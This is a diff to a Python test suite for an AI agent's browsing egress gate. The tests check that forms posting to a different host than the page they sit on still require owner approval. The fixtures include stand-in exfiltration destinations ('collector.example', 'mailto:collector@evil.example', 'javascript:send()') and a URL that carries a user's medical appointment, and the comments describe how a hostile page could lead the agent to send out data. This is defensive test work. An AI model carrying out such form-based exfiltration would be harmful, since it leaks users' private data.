@@ -12737,15 +12737,24 @@ class TestTheDrivenTwinOfTheComposedAddress:
     HOSTILE = "https://drop.example/search"
     SECRET = "his hospital appointment is on the 4th at 9am with dr Nowak"
 
-    def _form(self, method="get"):
+    def _form(self, method="get", sends_to=None):
+        """The page's form, with the destination the enumeration reads off it.
+
+        `sends_to` defaults to the page's own address, which is what a real
+        `<form>` with no action (or a relative one) resolves to. It is passed
+        explicitly rather than assumed because the whole of #346 is that the
+        two can differ."""
+        if sends_to is None:
+            sends_to = self.HOSTILE
         return browse.controls_from([
-            {"n": 1, "kind": "field", "name": "Search", "form": "f1"},
+            {"n": 1, "kind": "field", "name": "Search", "form": "f1",
+             "sends_to": sends_to},
             {"n": 2, "kind": "button", "name": "Go", "submits": True,
-             "method": method, "form": "f1"},
+             "method": method, "form": "f1", "sends_to": sends_to},
         ])
 
     def _agent(self, origin="user", vouched=(), granted=("drop.example",),
-               approve_tool="yes", method="get"):
+               approve_tool="yes", method="get", sends_to=None):
         asked: list = []
         logged: list = []
         if approve_tool == "yes":
@@ -12757,7 +12766,8 @@ class TestTheDrivenTwinOfTheComposedAddress:
         )
         agent._tainted = True  # the page was opened, which is what taints a turn
         agent._browse_view.remember(browse.Snapshot(
-            url=self.HOSTILE, title="", text="t", controls=self._form(method)
+            url=self.HOSTILE, title="", text="t",
+            controls=self._form(method, sends_to),
         ))
         agent._approved_hosts.update(vouched)
         agent._approved_sites.update(granted)
@@ -12984,6 +12994,186 @@ class TestTheDrivenTwinOfTheComposedAddress:
             ]})
             assert by_address == bool(asked), value
 
+    # ---------------------------------------------------------------- #346
+    #
+    # **The destination is the FORM's, never the page's.** The gate measured
+    # the page aish was standing on, so a page on a host the owner had vouched
+    # could carry `<form action="https://collector.example/x">` and send what
+    # aish typed with no card — while the identical values in a composed URL to
+    # `collector.example` drew one. That is the parity this class's own prose
+    # claims, broken by the mechanism the model gets to choose.
+
+    ELSEWHERE = "https://collector.example/collect"
+
+    def test_a_cross_origin_action_on_a_VOUCHED_page_still_asks(self):
+        """The defect, exactly. The page's host is vouched AND granted; the
+        form posts somewhere else entirely, and the card names where."""
+        agent, asked, _ = self._agent(
+            vouched=["drop.example"], sends_to=self.ELSEWHERE
+        )
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert len(asked) == 1
+        assert "send data to collector.example" in asked[0]
+        assert "drop.example" not in asked[0].split("aish would send")[0]
+
+    def test_the_composed_twin_of_that_address_fires_identically(self):
+        """**Parity, asserted in BOTH directions**, because that is what the
+        prose claims and therefore what the test has to pin. The same values,
+        the same true destination, the other mechanism — and the same verdict.
+
+        Both directions matter: a driven card where the composed address is
+        free would be the divergence pointing the other way, which is the
+        over-correction `test_the_value_arms_and_the_composed_arms_agree_host_for_host`
+        already caught once.
+
+        The driven half DENIES, deliberately: a yes writes a machine-wide vouch
+        for the destination, and the next agent built inside this test would
+        read it back and free the case that is supposed to fire."""
+        for vouched in (["drop.example"], []):
+            composed, _ = make_agent([])
+            composed._tainted = True
+            composed._approved_hosts.update(vouched)
+            by_address = composed._egress_novel_hosts(
+                "read_url",
+                {"url": "https://collector.example/collect?q="
+                        + urllib.parse.quote(self.SECRET)},
+            ) is not None
+            seen: list = []
+            driven, _, _ = self._agent(
+                vouched=vouched, sends_to=self.ELSEWHERE,
+                approve_tool=lambda n, a, p=None, s=seen: s.append(p) or False,
+            )
+            driven._browse_gate("browse_fill", {"steps": list(self.STEPS)})
+            assert bool(seen) == by_address, vouched
+            # …and both of them FIRE. A parity that held because neither side
+            # asked would pass this test and pin nothing.
+            assert by_address, vouched
+            assert "collector.example" in seen[0]
+
+    def test_vouching_the_true_destination_frees_it_and_the_page_does_not(self):
+        """The vouch collected is the one the card NAMED. A yes for the PAGE
+        must not free a form that posts elsewhere, and a yes for the
+        DESTINATION must free it — otherwise the card asks about one host and
+        grants another.
+
+        The free case runs FIRST, because a yes in the other one writes a
+        machine-wide vouch that the next agent would read back."""
+        destination, asked2, _ = self._agent(
+            vouched=["collector.example"], sends_to=self.ELSEWHERE
+        )
+        assert destination._browse_gate(
+            "browse_fill", {"steps": list(self.STEPS)}
+        ) is None
+        assert asked2 == []
+
+        page_only, asked, _ = self._agent(
+            vouched=["drop.example"], sends_to=self.ELSEWHERE
+        )
+        page_only._browse_gate("browse_fill", {"steps": list(self.STEPS)})
+        assert len(asked) == 1
+
+    def test_a_yes_vouches_the_DESTINATION_and_not_the_page(self):
+        """What enters `_approved_hosts` is exactly the host the preview named
+        — residual (c)'s invariant, applied to the host the form really
+        reaches."""
+        agent, asked, logged = self._agent(sends_to=self.ELSEWHERE)
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert "collector.example" in agent._approved_hosts
+        assert "drop.example" not in agent._approved_hosts
+        assert {"kind": "egress_vouch", "host": "collector.example"} in logged
+        assert {"kind": "egress_vouch", "host": "drop.example"} not in logged
+
+    def test_a_same_origin_action_at_a_vouched_host_is_free_exactly_as_today(self):
+        """The control arm, and the reason this costs no cards: an ordinary
+        form posts to its own site, which is where the vouch already is."""
+        agent, asked, _ = self._agent(
+            vouched=["drop.example"], sends_to="https://drop.example/results"
+        )
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert asked == []
+
+    def test_a_relative_action_resolves_against_the_page_and_not_to_nothing(self):
+        """`action="/checkout"` is the ordinary way forms are written. The
+        enumeration resolves it against the document's base BEFORE Python sees
+        it — which is why the resolution has to happen in the page — so it must
+        read as the page's own host and stay free at a vouched one."""
+        agent, asked, _ = self._agent(
+            vouched=["drop.example"], sends_to="https://drop.example/checkout"
+        )
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert asked == []
+
+    def test_a_form_with_no_readable_destination_fails_closed(self):
+        """No `<form>` at all (a script may submit it anywhere), a `mailto:` or
+        `javascript:` action, a string no parser accepts. aish cannot say where
+        the values would go, so it does not assume — and the card says the
+        thing that was actually established, not a cause nothing checked."""
+        for unreadable in ("", "mailto:collector@evil.example", "javascript:send()"):
+            agent, asked, _ = self._agent(
+                vouched=["drop.example"], sends_to=unreadable
+            )
+            assert agent._browse_gate(
+                "browse_fill", {"steps": list(self.STEPS)}
+            ) is None
+            assert len(asked) == 1, unreadable
+            assert agent_module.UNREADABLE_DESTINATION in asked[0], unreadable
+
+    def test_an_unreadable_destination_never_enters_the_vouch_store(self):
+        """The placeholder is a sentence, not a host, and the store is
+        machine-wide and permanent. A yes answers for this one press and
+        vouches nothing — the same rule `the search engine` is held to."""
+        agent, _, logged = self._agent(vouched=["drop.example"], sends_to="")
+        assert agent._browse_gate("browse_fill", {"steps": list(self.STEPS)}) is None
+        assert agent_module.UNREADABLE_DESTINATION not in agent._approved_hosts
+        assert agent._approved_hosts == {"drop.example"}
+        assert not any(row.get("kind") == "egress_vouch" for row in logged)
+
+    def test_enter_in_a_field_with_no_form_fails_closed_too(self):
+        """`browse_act(action="type", submit=True)` resolves to a FIELD, and a
+        field outside any form is submitted by script — to anywhere. The Enter
+        path was already failed closed on *is this a submit*; this is the same
+        answer to *where would it go*."""
+        agent, asked, _ = self._agent(vouched=["drop.example"], sends_to="")
+        assert agent._browse_gate("browse_act", {
+            "target": "Search", "action": "type", "text": self.SECRET,
+            "submit": True,
+        }) is None
+        assert len(asked) == 1
+        assert agent_module.UNREADABLE_DESTINATION in asked[0]
+
+    def test_the_ledger_still_keys_on_the_page_the_values_were_typed_at(self):
+        """The two hosts are different questions and the fix must not merge
+        them the other way round. Type in one call at a page whose form posts
+        elsewhere, submit in another: the typed value is remembered against the
+        PAGE, and the card is asked about the DESTINATION."""
+        agent, asked, _ = self._agent(sends_to=self.ELSEWHERE)
+        fill = {"steps": [dict(self.STEPS[0])]}
+        assert agent._browse_gate("browse_fill", fill) is None
+        assert asked == []
+        agent._note_typed_values("browse_fill", fill)
+        assert agent._typed_this_task == {
+            "drop.example": [("Search", self.SECRET)]
+        }
+        assert agent._browse_gate("browse_act", {"target": "Go"}) is None
+        assert len(asked) == 1
+        assert "send data to collector.example" in asked[0]
+        assert "1 value(s)" in asked[0]
+
+    def test_the_host_is_read_with_the_composed_twins_own_parser(self):
+        """One vocabulary, or a yes on one channel fails to answer the other. A
+        port, an uppercase host and a `www.` are spelled the same way both
+        sides — exact, lowercased, no port, never www-stripped."""
+        for written, host in (
+            ("https://Collector.Example/x", "collector.example"),
+            ("https://collector.example:8443/x", "collector.example"),
+            ("https://www.collector.example/x", "www.collector.example"),
+        ):
+            agent, _, _ = self._agent(sends_to=written)
+            assert agent._driven_host("browse_fill", {
+                "steps": list(self.STEPS)
+            }) == host, written
+            assert agent_module._exact_host(written) == host
+
     def test_a_remembered_batch_never_stands_in_for_a_send_never_vouched(self):
         """`_browse_batch_gate` short-circuits a batch whose card text it has
         already been given a yes for. That memo answers for the BATCH, and a yes
@@ -12996,7 +13186,8 @@ class TestTheDrivenTwinOfTheComposedAddress:
         # what this test is about is the memo, not the held-values block.
         controls = browse.controls_from([
             {"n": 1, "kind": "field", "name": "Search"},
-            {"n": 2, "kind": "button", "name": "Wyślij", "submits": True},
+            {"n": 2, "kind": "button", "name": "Wyślij", "submits": True,
+             "sends_to": self.HOSTILE},
         ])
         args = {"steps": [
             {"target": "Search", "value": self.SECRET},
@@ -13105,12 +13296,19 @@ class TestTheOwnersDeclaredValues:
         )
         agent_module.secrets._invalidate_personal()
 
-    def _form(self):
+    def _form(self, sends_to=PAGE):
+        """The form, with the destination the enumeration reads off it (#346).
+
+        Same-origin by default — what a `<form>` with no action, or a relative
+        one, resolves to — because where this form SENDS is not what these
+        tests are about; the value is."""
         return browse.controls_from([
-            {"n": 1, "kind": "field", "name": "Adres", "form": "f1"},
-            {"n": 2, "kind": "field", "name": "Telefon", "form": "f1"},
+            {"n": 1, "kind": "field", "name": "Adres", "form": "f1",
+             "sends_to": sends_to},
+            {"n": 2, "kind": "field", "name": "Telefon", "form": "f1",
+             "sends_to": sends_to},
             {"n": 3, "kind": "button", "name": "Go", "submits": True,
-             "method": "get", "form": "f1"},
+             "method": "get", "form": "f1", "sends_to": sends_to},
         ])
 
     def _agent(self, origin="user", approve_tool="yes", url=PAGE):
@@ -13125,7 +13323,7 @@ class TestTheOwnersDeclaredValues:
         )
         agent._tainted = True
         agent._browse_view.remember(browse.Snapshot(
-            url=url, title="", text="t", controls=self._form()
+            url=url, title="", text="t", controls=self._form(url)
         ))
         # Granted AND vouched: the ordinary steady state after M3's seeding, and
         # the only configuration in which this card can be shown alone. Anything
